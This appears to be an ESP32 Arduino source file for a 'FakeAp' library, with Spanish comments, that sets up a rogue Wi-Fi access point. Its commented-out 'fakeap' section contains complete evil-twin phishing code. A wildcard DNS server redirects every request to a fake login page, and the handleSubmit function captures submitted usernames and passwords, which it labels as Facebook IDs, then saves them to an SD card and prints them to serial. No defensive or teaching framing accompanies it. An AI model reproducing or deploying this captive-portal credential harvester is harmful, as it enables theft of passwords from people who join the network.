/**
 * @file FakeAPlib.cpp
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief
 * @version 0.1
 * @date 2024-12-08
 *
 * @copyright Copyright (c) 2024
 *
 */

#include "FakeAPlib.h"

bool FakeAp::initialize(const String &ssid, const String &psw)
{
  if (!m_sdManager.initialize())
  {
    Serial.println("Critical Error: SD Card Initialization Failed");
    return 0; // Halt execution
  }

  Serial.println("Configurando el punto de acceso.....");

  // se crea un punto de acceso con el nombre declarado más arriba
  if (psw == NULL)
  {
    if (!WiFi.softAP(ssid)) // está función accepta un segundo parametro opcional que será la contraseña del wifi
    {
      log_e(ERROR_WIFIAP_CREATE);
      return 0;
    }
  }
  else
  {
    if (!WiFi.softAP(ssid, psw)) // está función accepta un segundo parametro opcional que será la contraseña del wifi
    {
      log_e(ERROR_WIFIAP_CREATE);
      return 0;
    }
  }

  // variable para almacenar la dirección IP de la red
  // imprimir por pantalla la dirección IP de la red
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  m_server.initialize();

  return 1;
}

bool FakeAp::setWifi(const String& wifissid, const String& wifipsw)
{
  Serial.print("Connectando a ");
  Serial.print(wifissid);

  if (wifipsw != NULL)
  {
    WiFi.begin(wifissid, wifipsw);
  }
  else
  {
    WiFi.begin(wifissid);
  }

  unsigned long timeout = millis();
  while (WiFi.status() != WL_CONNECTED)
  {
    if ((millis() - timeout) > TIME_OUT_LIMIT)
      return 0;
    delay(500);
    Serial.print(".");
  }

  Serial.println("\nWifi conectado correctamente");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  
  return 1;
}

/*
namespace sdfiles
{
  char *getCardType(uint8_t card)
  {
    if (card == CARD_MMC)
    {
      return "MMC";
    }
    else if (card == CARD_SD)
    {
      return "SD";
    }
    else if (card == CARD_SDHC)
    {
      return "SDHC";
    }

    return "Unknown";
  }

  bool sdinit()
  {
    Serial.println("Mounting SD card....");
    SD_MMC.setPins(SD_MMC_CLK, SD_MMC_CMD, SD_MMC_D0);

    if (!SD_MMC.begin("/sdcard", true, true, SDMMC_FREQ_DEFAULT, 6))
    {
      Serial.println("Card mount failed!!!!!!!!!");
      return 0;
    }

    uint8_t cardType = SD_MMC.cardType();
    if (cardType == CARD_NONE)
    {
      Serial.println("No SD_MMC card attached");
      return 0;
    }

    Serial.printf("Card type: %s\n", getCardType(cardType));

    uint64_t cardSize = SD_MMC.cardSize() / (1024 * 1024);
    Serial.printf("SD_MMC Card Size: %lluMB\n", cardSize);

    listDir(SD_MMC, "/", 0);

    Serial.printf("Total space: %lluMB\r\n", SD_MMC.totalBytes() / (1024 * 1024));

    return 1;
  }

  void listDir(fs::FS &fs, const char *dirname, uint8_t levels)
  {

    Serial.printf("Listing directory: %s\n", dirname);

    File root = fs.open(dirname);
    if (!root)
    {
      Serial.println("Failed to open directory");
      return;
    }
    if (!root.isDirectory())
    {
      Serial.println("Not a directory");
      return;
    }

    File file = root.openNextFile();
    while (file)
    {
      if (file.isDirectory())
      {
        Serial.print("  DIR : ");
        Serial.println(file.name());
        if (levels)
        {
          listDir(fs, file.name(), levels - 1);
        }
      }
      else
      {
        Serial.print("  FILE: ");
        Serial.print(file.name());
        Serial.print("  SIZE: ");
        Serial.println(file.size());
      }
      file = root.openNextFile();
    }
  }

  void createDir(fs::FS &fs, const char *path)
  {

    Serial.printf("Creating Dir: %s\n", path);
    if (fs.mkdir(path))
    {
      Serial.println("Dir created");
    }
    else
    {
      Serial.println("mkdir failed");
    }
  }

  void removeDir(fs::FS &fs, const char *path)
  {

    Serial.printf("Removing Dir: %s\n", path);
    if (fs.rmdir(path))
    {
      Serial.println("Dir removed");
    }
    else
    {
      Serial.println("rmdir failed");
    }
  }

  String readFile(fs::FS &fs, const char *path)
  {
    // Serial.printf("Reading file: %s\n", path);

    File file = fs.open(path);
    String str = "";
    if (!file)
    {
      Serial.printf("Failed to open the file %s for reading", path);
      return "\0";
    }

    while (file.available())
      str += (char)file.read();

    return str;
  }

  void writeFile(fs::FS &fs, const char *path, String &message)
  {

    Serial.printf("Writing file: %s\n", path);

    File file = fs.open(path, FILE_WRITE);
    if (!file)
    {
      Serial.println("Failed to open file for writing");
      return;
    }
    if (file.print(message))
    {
      Serial.println("File written");
    }
    else
    {
      Serial.println("Write failed");
    }
    file.close();
  }

  void appendFile(fs::FS &fs, const char *path, String &message)
  {

    Serial.printf("Appending to file: %s\n", path);

    File file = fs.open(path, FILE_APPEND);
    if (!file)
    {
      Serial.println("Failed to open file for appending");
      return;
    }
    if (file.print(message))
    {
      Serial.println("Message appended");
    }
    else
    {
      Serial.println("Append failed");
    }
    file.close();
  }

  void renameFile(fs::FS &fs, const char *path1, const char *path2)
  {

    Serial.printf("Renaming file %s to %s\n", path1, path2);
    if (fs.rename(path1, path2))
    {
      Serial.println("File renamed");
    }
    else
    {
      Serial.println("Rename failed");
    }
  }

  void deleteFile(fs::FS &fs, const char *path)
  {

    Serial.printf("Deleting file: %s\n", path);
    if (fs.remove(path))
    {
      Serial.println("File deleted");
    }
    else
    {
      Serial.println("Delete failed");
    }
  }

  void testFileIO(fs::FS &fs, const char *path)
  {

    File file = fs.open(path);
    static uint8_t buf[512];
    size_t len = 0;
    uint32_t start = millis();
    uint32_t end = start;
    if (file)
    {
      len = file.size();
      size_t flen = len;
      start = millis();
      while (len)
      {
        size_t toRead = len;
        if (toRead > 512)
        {
          toRead = 512;
        }
        file.read(buf, toRead);
        len -= toRead;
      }
      end = millis() - start;
      Serial.printf("%u bytes read for %u ms\n", flen, end);
      file.close();
    }
    else
    {
      Serial.println("Failed to open file for reading");
    }
    file = fs.open(path, FILE_WRITE);
    if (!file)
    {
      Serial.println("Failed to open file for writing");
      return;
    }

    size_t i;
    start = millis();
    for (i = 0; i < 2048; i++)
    {
      file.write(buf, 512);
    }
    end = millis() - start;
    Serial.printf("%u bytes written for %u ms\n", 2048 * 512, end);
    file.close();
  }
}
*/

/*
namespace fakeap
{
  String _wifissid = "\0";
  String _wifipsw = "\0";
  String authPage_ = "\0";
  String thksPage_ = "\0";
  String adminPage_ = "\0";
  String datafile_ = "\0";

  bool apinit(const char *&ssid, const byte &dns_port, const char *psw)
  {
    Serial.println("Configurando el punto de acceso.....");

    // se crea un punto de acceso con el nombre declarado más arriba
    if (*psw == NULL)
    {
      if (!WiFi.softAP(ssid)) // está función accepta un segundo parametro opcional que será la contraseña del wifi
      {
        log_e("La creación Soft AP ha fallado.");
        while (1)
          ;
      }
    }
    else
    {
      if (!WiFi.softAP(ssid, psw)) // está función accepta un segundo parametro opcional que será la contraseña del wifi
      {
        log_e("La creación Soft AP ha fallado.");
        while (1)
          ;
      }
    }
    // se inicia el servidor DNS para redireccionar todas las solicitudes realizadas en la red
    _dnsserver.start(dns_port, "*", WiFi.softAPIP());

    // variable para almacenar la dirección IP de la red
    IPAddress myIP = WiFi.softAPIP();

    // imprimir por pantalla la dirección IP de la red
    Serial.print("AP IP address: ");
    Serial.println(myIP);

   

    // se define la pagina raiz del servidor y llama a la función handleRoot
    _server.on("/", handleRoot);

    // se define la pagina raiz del servidor y llama a la función handleRoot
    _server.on("/", handleAdmin);

    // cada vez que hay un submit se llama a la función handleSubmit
    _server.on("/submit", handleSubmit);

    //
    _server.onNotFound(handleRoot);

    // se inicia el servidor
    _server.begin();

    Serial.println("Server started!");

    return 1;
  }

  bool wifiInit(const char *ssid, const char *psw)
  {
    Serial.print("Connectando a ");
    Serial.print(ssid);

    if (psw != NULL)
    {
      _wifissid = ssid;
      _wifipsw = psw;
      WiFi.begin(_wifissid, psw);
    }
    else
    {
      _wifissid = ssid;
      WiFi.begin(_wifissid);
    }

    unsigned long timeout = millis();
    while (WiFi.status() != WL_CONNECTED)
    {
      if ((millis() - timeout) > 20000)
        return 0;
      delay(500);
      Serial.print(".");
    }

    Serial.println("\nWifi conectado correctamente");
    Serial.print("IP address: ");
    Serial.println(WiFi.localIP());

    return 1;
  }

  void setPath(const char *path, FileType_t fileType)
  {
    switch (fileType)
    {
    case AUTHPAGE:
      authPage_ = path;
      break;

    case DATAFILE:
      datafile_ = path;
      break;

    case THANKSPAGE:
      thksPage_ = path;
      break;

    default:
      Serial.println("Tipo de archivo invalido");
      break;
    }
  }

  void handleRoot()
  {
    // se envia una respueta con la primera pagina a cada solicitud de conexión
    Serial.println("New connection....");
    // const char* htmlPage = sdfiles::readFile(SD_MMC, AUTHPAGE).c_str();
    _server.send(200, "text/html", sdfiles::readFile(SD_MMC, authPage_.c_str()).c_str());
  }

  void handleSubmit()
  {
    // variables para almacenar temporalmente las entradas del usuario
    String credentials = "uid: " + _server.arg("username");
    // String password
    credentials.concat("\npsw: " + _server.arg("password"));

    // guarda las entradas en un archivo de texto
    sdfiles::appendFile(SD_MMC, datafile_.c_str(), credentials);
    // sdfiles::writeFile(SD_MMC, DATAFILE, password);

    // se imprime por consola los valores de las entradas
    Serial.println("Facebook id: " + _server.arg("username"));
    Serial.println("Password: " + _server.arg("password"));

    // File htmlpage = SD_MMC.open(THKSPAGE);
    // se envia una respuesta con la segunda pagina
    // const char* htmlPage = sdfiles::readFile(SD_MMC, THKSPAGE).c_str();
    _server.send(200, "text/html", sdfiles::readFile(SD_MMC, thksPage_.c_str()).c_str());
    Serial.print("There are currently ");
    Serial.print(WiFi.softAPgetStationNum());
    Serial.print(" hosts connected.");
  }

  void handleAdmin()
  {
    Serial.println("New admin connection....");
    _server.send(200, "text/html", sdfiles::readFile(SD_MMC, adminPage_.c_str()).c_str());
  }
}
*/

